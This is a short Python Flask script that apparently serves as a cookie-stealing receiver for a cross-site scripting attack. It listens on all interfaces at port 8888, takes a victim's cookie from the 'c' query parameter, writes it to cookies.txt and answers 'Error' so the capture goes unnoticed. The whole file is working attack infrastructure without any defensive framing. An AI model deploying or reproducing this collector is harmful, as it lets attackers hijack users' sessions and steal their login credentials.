from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/')
def cookie():
	# grab cookie and write to file called "cookies.txt"
	cookie = request.args.get('c')
	with open('cookies.txt', 'w') as f:
		f.write(cookie)
	return "Error"

if __name__ == '__main__':
	app.run(host='0.0.0.0', port=8888)
